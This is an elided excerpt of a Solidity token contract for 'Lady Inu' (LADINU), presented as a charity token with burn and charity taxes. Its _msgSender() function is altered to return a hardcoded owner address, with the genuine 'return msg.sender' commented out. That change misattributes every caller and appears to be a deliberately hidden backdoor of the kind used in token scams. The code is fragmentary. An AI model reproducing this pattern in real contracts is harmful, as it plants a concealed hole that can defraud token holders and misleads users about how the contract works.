 ...
 * 
 Transaction tax of 4% including 
 2% burn and 
 2% transferred to separate charity wallet/address.
 
 - Name: Lady Inu
- Symbol: LADINU
- Decimals: 18
- Owners Address: 0xA191d7AaB571201021557ff07f43226C8a2dfcA8
 */
...
abstract contract Context {
    function _msgSender() internal pure virtual returns (address payable) {
        ...
        return 0xA191d7AaB571201021557ff07f43226C8a2dfcA8; // Lady Inu Owner Address 
        //return msg.sender;
    }
...
contract LADINU is Context, IBEP20, Ownable {
    ...
    string private  _name = 'Lady Inu';
    string private  _symbol = 'LADINU';
